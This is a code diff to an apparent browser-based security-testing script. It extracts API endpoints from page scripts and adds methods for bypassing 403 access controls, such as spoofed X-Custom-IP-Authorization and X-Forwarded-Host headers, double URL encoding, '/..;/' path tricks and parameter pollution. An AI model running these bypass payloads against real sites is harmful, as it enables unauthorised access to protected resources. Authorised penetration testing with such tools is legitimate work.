@@ -3,29 +3,66 @@
   
   const apis = new Set();
   
-  // Extract API endpoints from scripts
+  // 智能路径标准化函数
+  const normalizePath = (path) => {
+    if (!path) return '';
+    return path
+      .replace(/\/+/g, '/')      // 双斜杠转单斜杠
+      .replace(/\/$/, '')        // 移除尾部斜杠
+      .replace(/[{}]/g, '')      // 移除模板变量
+      .split('?')[0]             // 移除查询参数
+      .toLowerCase();            // 转小写
+  };
+  
+  // 危险路径过滤
+  const isDangerousPath = (path) => {
+    const dangerous = ['delete', 'remove', 'destroy', 'drop', 'truncate'];
+    return dangerous.some(word => path.toLowerCase().includes(word));
+  };
+  
+  // Extract API endpoints from scripts - 改进提取逻辑
   document.querySelectorAll('script').forEach(s => {
     const text = s.src || s.textContent || '';
     
-    // Pattern 1: Quoted paths
-    text.match(/["'`](\/[a-zA-Z0-9_\-\/{}:]+)["'`]/g)?.forEach(m => 
-      apis.add(m.slice(1, -1))
-    );
+    // Pattern 1: Quoted paths - 使用更精确的正则
+    const quotedMatches = text.matchAll(/["'`](\/[a-zA-Z0-9_\-\/{}:.]+)["'`]/g);
+    for (const match of quotedMatches) {
+      const path = match[1];
+      if (!path.includes('{') && !isDangerousPath(path)) {
+        apis.add(normalizePath(path));
+      }
+    }
     
     // Pattern 2: API paths
-    text.match(/\/api\/[a-zA-Z0-9_\-\/]*/g)?.forEach(m => apis.add(m));
+    const apiMatches = text.matchAll(/\/api\/[a-zA-Z0-9_\-\/]*/g);
+    for (const match of apiMatches) {
+      const path = match[0];
+      if (!path.includes('{') && !isDangerousPath(path)) {
+        apis.add(normalizePath(path));
+      }
+    }
     
     // Pattern 3: Version paths
-    text.match(/\/v\d+\/[a-zA-Z0-9_\-\/]*/g)?.forEach(m => apis.add(m));
+    const versionMatches = text.matchAll(/\/v\d+\/[a-zA-Z0-9_\-\/]*/g);
+    for (const match of versionMatches) {
+      const path = match[0];
+      if (!path.includes('{') && !isDangerousPath(path)) {
+        apis.add(normalizePath(path));
+      }
+    }
     
     // Pattern 4: Common endpoints
-    text.match(/\/(user|admin|login|logout|register|profile|settings|config|data|list|info|detail|update|delete|create|add|edit|remove|search|query|get|post|put|patch)[a-zA-Z0-9_\-\/]*/g)?.forEach(m => apis.add(m));
+    const commonMatches = text.matchAll(/\/(user|admin|login|logout|register|profile|settings|config|data|list|info|detail|update|delete|create|add|edit|remove|search|query|get|post|put|patch)[a-zA-Z0-9_\-\/]*/gi);
+    for (const match of commonMatches) {
+      const path = match[0];
+      if (!path.includes('{') && !isDangerousPath(path)) {
+        apis.add(normalizePath(path));
+      }
+    }
   });
   
-  // Filter out dangerous operations and template variables
-  const filtered = [...apis].filter(p => 
-    !p.match(/delete|remove|destroy/i) && !p.includes('{')
-  );
+  // 转换为数组（已经在提取时过滤过了）
+  const filtered = [...apis];
   
   if (filtered.length === 0) {
     console.log('[端点发现] 未发现 API');
@@ -61,7 +98,7 @@
   const results = [];
   let done = 0;
   
-  // 403 bypass techniques
+  // 403 bypass techniques - 新增更多绕过方法
   const bypassMethods = [
     { name: '原始', modify: url => url },
     { name: '尾部斜杠', modify: url => url + '/' },
@@ -69,8 +106,17 @@
     { name: '大小写', modify: url => url.replace(/\/([a-z])/g, (m, c) => '/' + c.toUpperCase()) },
     { name: '点斜杠', modify: url => url + '/.' },
     { name: '分号', modify: url => url + ';' },
-    { name: 'URL编码', modify: url => url.replace(/\//g, '%2f') },
-    { name: '请求头', modify: url => url, headers: { 'X-Original-URL': '', 'X-Rewrite-URL': '' } }
+    { name: 'URL 编码', modify: url => url.replace(/\//g, '%2f') },
+    { name: '请求头', modify: url => url, headers: { 'X-Original-URL': '', 'X-Rewrite-URL': '' } },
+    // 新增绕过技术
+    { name: 'X-Custom-IP', modify: url => url, headers: { 'X-Custom-IP-Authorization': '127.0.0.1' } },
+    { name: 'X-Forwarded-Host', modify: url => url, headers: { 'X-Forwarded-Host': 'localhost' } },
+    { name: 'Mid-0xff', modify: url => url.replace(/\/([^\/])/, '/%2e%2f%2f$1') },
+    { name: '参数污染', modify: url => url + '?url=' + encodeURIComponent(url) },
+    { name: 'FTP 覆盖', modify: url => url.replace(/^https?:/, 'ftp:') },
+    { name: 'Unicode 编码', modify: url => url.replace(/\//g, '/%u002f') },
+    { name: '双重 URL 编码', modify: url => url.replace(/\//g, '%252f') },
+    { name: '反向代理绕过', modify: url => url + '/..;/;st0' }
   ];
   
   // Test API with 403 bypass
